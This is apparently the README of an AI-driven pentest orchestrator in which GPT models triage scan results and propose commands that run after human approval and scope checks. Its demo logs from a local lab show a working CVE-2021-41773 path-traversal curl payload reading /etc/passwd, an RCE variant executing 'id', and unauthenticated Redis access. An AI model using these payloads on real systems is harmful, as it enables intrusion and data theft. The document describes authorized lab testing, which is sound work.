# HydraMind — Multi-Model AI Orchestrator for Offensive Security

HydraMind automates an authorized web pentest workflow:
recon → AI triage → vuln scan → AI reasoning → (human approval) → exploit (lab only) → AI report.
Many models (the heads), one reasoning core (the mind).

**Ethics:** runs ONLY against targets in `config/scope.yaml` — labs, owned systems, or in-scope bug bounty. Nothing else.

## Requirements
- Kali Linux, Python 3.11+, nmap, gobuster, nikto, curl, sqlmap, redis-cli

## Setup
```bash
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
export OPENAI_API_KEY=sk-...   # required for the AI heads
```

## Run
```bash
python3 main.py --target scanme.nmap.org --skip-nikto
python3 main.py --target 127.0.0.1 --ports 1-10000 --skip-nikto
```
Out-of-scope targets are refused by the Scope Firewall before any subprocess runs.

Pipeline: scope check → recon (nmap → gobuster → nikto, all saved to SQLite) →
GPT-4o-mini triage → **per-finding GPT-4o Reasoner** → **human approval gate** →
approved actions execute via `engine/runner.py` (recon, fetch, sqlmap,
redis-cli) → `data/report_N.json`.

### Scope firewall — two-stage authorization
`config/scope.yaml` supports two forms side by side:
- legacy `allowed_hosts` — recon only; exploitation-class tools always refused
- rich `targets:` entries — per-target policy:
  `host`, `authorized`, `environment: lab | live_authorized`,
  `allowed_tools`, `forbidden_tools`, `program_rules_url`, `rate_limit`

Check 1: is the host authorized at all? Check 2: is the specific tool allowed
for this target (`check_tool`)? Exploitation-class tools (sqlmap/hydra/wpscan/
commix/metasploit) require `environment: lab` regardless of `allowed_tools`.
Every allow/deny decision is logged to the `scope_events` table.

### Reasoner + approval gate
- Reasons about ONE finding at a time. Context includes sibling findings and
  the history of already-approved/executed actions for the target, so attack
  chains build step by step — each step human-approved.
- The proposed command must survive `validate_action()`: tool whitelist
  (nmap, gobuster, nikto, curl, sqlmap, redis-cli), fail-closed argument
  validation, no file I/O args, no destructive redis commands, and it must
  reference the scoped target. One bad token rejects the action.
- `passive` proposals default to **yes**; `active`/`exploit` default to **NO**
  — you must type `y` explicitly. No input / EOF = never runs.
- On `n`: a one-line rejection reason is required and logged.
- Every decision lands in `reasoner_decisions` (FK to `triage_findings`) with
  hypothesis, proposed command, confidence, risk level, human decision,
  rejection reason, execution result.
- Approved actions execute — one human approval is the gate. Exploitation
  primitives: `curl` (fetch/traversal/RCE payloads), `sqlmap` (batch mode),
  `redis-cli` (PING/INFO/CONFIG/KEYS...). Exploit-class tools still require
  `environment: lab` per the scope policy.
- Model override: `HYDRAMIND_REASONER_MODEL=gpt-4o`

Demo transcript: see below. First full live run: DVWA lab (Docker container on
this Kali VM, `http://127.0.0.1:8081`), 2026-11-18.

### Demo run — DVWA lab (real terminal output, trimmed)

```text
[scope] '127.0.0.1' authorized.

[nmap] scanning ports + services...
       3 open port(s) found.            # 3000, 8080 (Apache 2.4.49), 8081 (DVWA / Apache 2.4.25)
[gobuster] brute-forcing http://127.0.0.1:8080...
           5 path(s) found.
[gobuster] brute-forcing http://127.0.0.1:8081...
           12 path(s) found.            # /config, /docs, /external, /php.ini, ...
[nikto] scanning http://127.0.0.1:8080 ... 0 finding(s).
[nikto] scanning http://127.0.0.1:8081 ... 0 finding(s).   # DVWA needs auth; nikto sees little

[triager] sending 20 finding(s) to GPT-4o-mini for analysis...
  [HIGH]   #1 Apache httpd 2.4.49 detected
  [MEDIUM] #2 Apache httpd 2.4.25 detected
  [MEDIUM] #3 php.ini file accessible at /php.ini
  [LOW]    #4 sensitive paths: /config, /docs, /external

--- Finding #1 [HIGH] Apache httpd version 2.4.49 detected
  hypothesis : ...CVE-2021-41773 path traversal...
  command    : nikto -h http://127.0.0.1
  expected   : confirm known vulns/misconfigs
  confidence : 70%   risk: passive
    Approve action for finding #1? [Y/n]   → running...
  → done: rc=0, 1 finding(s) @ http://127.0.0.1

--- Finding #2 [MEDIUM] Apache httpd version 2.4.25 detected
  command    : nikto -h http://127.0.0.1
    Approve action for finding #2? [Y/n]   rejection reason (one line):
      → "Duplicate of #1; port 80 closed — use :8081/:8080"

--- Finding #3 [MEDIUM] php.ini file accessible at /php.ini
  command    : nikto -h http://127.0.0.1:8080
    Approve action for finding #3? [Y/n]   rejection reason (one line):
      → "Duplicate of recon nikto on :8080; php.ini lives on :8081"

--- Finding #4 [LOW] Potential sensitive paths found: /config, /docs, /external
  command    : nikto -h http://127.0.0.1:8080 -C all
    Approve action for finding #4? [Y/n]   rejection reason (one line):
      → "Paths discovered on :8081; :8080 already nikto-scanned"

[db] full report saved → data/report_2.json
```

All four decisions are queryable in `reasoner_decisions` (finding FK, command,
confidence, decision, rejection reason, result). The full report is
`data/report_2.json`.

### Demo run — Phase 3 exploitation, local lab (real terminal output, trimmed)

```text
python3 main.py --target 127.0.0.1 --skip-nikto --ports 1-10000

[scope] '127.0.0.1' authorized.

[nmap] scanning ports + services...
       4 open port(s) found.            # 3000, 6379 (Redis), 8080 (Apache 2.4.49), 8081 (DVWA)
[gobuster] brute-forcing http://127.0.0.1:8080...   5 path(s) found.
[gobuster] brute-forcing http://127.0.0.1:8081...   12 path(s) found.

[triager] sending 21 finding(s) to GPT-4o-mini for analysis...
  [HIGH]   #1 Redis service running on port 6379
  [MEDIUM] #2 Apache httpd version 2.4.49 running on port 8080
  [MEDIUM] #3 php.ini file accessible on port 8081
  [MEDIUM] #4 index.php file redirects on port 8081

--- Finding #1 [HIGH] Redis service running on port 6379
  command    : redis-cli -h 127.0.0.1 -p 6379 INFO
    Approve action for finding #1? [y/N]   → running...
  → done: rc=0, 1 finding(s) — # Server redis_version:4.0.14 ...
     + Redis 4.0.14 INFO exposed unauthenticated

--- Finding #2 [MEDIUM] Apache httpd version 2.4.49 running on port 8080
  command    : curl -s --path-as-is 'http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    Approve action for finding #2? [y/N]   → running...
  → done: rc=0, 1 finding(s) — root:x:0:0:root:/root:/bin/bash daemon:x:1:1:...
     + Path traversal: /etc/passwd exposed

--- Finding #3 [MEDIUM] php.ini file accessible on port 8081
  command    : curl -s http://127.0.0.1:8081/php.ini
    Approve action for finding #3? [Y/n]   → running...
  → done: rc=0, 0 finding(s) — ; This file attempts to overwrite the original php.ini file...
      allow_url_fopen on   allow_url_include on

--- Finding #4 [MEDIUM] index.php file redirects on port 8081
  command    : curl -s -I http://127.0.0.1:8081/index.php
    Approve action for finding #4? [Y/n]   → running...
  → done: rc=0, 0 finding(s) — HTTP/1.1 302 Found ... Server: Apache/2.4.25 (Debian) ...

[db] full report saved → data/report_5.json
```

All four actions were approved and executed. The CVE-2021-41773 RCE variant
(`POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh` with
`echo Content-Type: text/plain; echo; id`) was also verified against the same
lab container: `uid=1(daemon) gid=1(daemon)`.

## Lab targets (local, scope-listed, `environment: lab`)

| Target | Service | Status |
|---|---|---|
| `127.0.0.1:3000` | OWASP Juice Shop | container down — restart needed |
| `127.0.0.1:6379` | Redis 4.0.14 | unauthenticated (INFO verified) |
| `127.0.0.1:8080` | Apache httpd 2.4.49 | CVE-2021-41773 traversal + RCE verified |
| `127.0.0.1:8081` | DVWA v1.10 | admin/password, security low |

Planned infrastructure: public-IP lab host (GitHub Student benefits) and
Metasploit setup, so tests can run beyond localhost.

## Roadmap
- Phase 0 (done): scope firewall + nmap engine + SQLite store
- Phase 1 (done): gobuster + nikto + AI triage
- Phase 2 (done): per-finding AI reasoner + human approval gate + two-stage scope policy
- Phase 3 (done): executable exploitation behind the single human gate —
  curl (fetch/traversal/RCE), sqlmap (batch), redis-cli (unauth Redis);
  CVE-2021-41773 and Redis verified live on the local lab
- Phase 3 (remaining): hydra/wpscan/commix modules, sqlmap authenticated
  sessions (login cookies), Juice Shop retest when the container is back
- Phase 4: validator (second model family) + report writer + PortSwigger eval
- Phase 5: n8n trigger/notify + dashboard
- Phase 6: LangGraph agent + RAG (CVE/ExploitDB) + model router
